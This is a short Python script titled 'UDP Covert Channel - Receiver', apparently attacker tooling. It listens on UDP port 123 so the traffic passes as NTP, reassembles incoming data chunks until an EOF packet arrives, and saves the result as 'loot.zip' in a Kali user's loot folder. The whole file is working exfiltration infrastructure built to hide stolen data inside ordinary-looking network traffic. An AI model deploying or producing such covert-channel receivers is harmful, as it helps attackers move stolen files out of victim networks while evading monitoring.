# UDP Covert Channel - Receiver
# Listens on port 123 (NTP) for incoming binary data chunks
# Reassembles chunks into loot.zip upon receiving EOF signal
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 123))
data = bytearray()
while True:
    chunk, _ = s.recvfrom(65507)
    if chunk == b'EOF':
        break
    data.extend(chunk)
open('/home/kali/loot/loot.zip', 'wb').write(data)
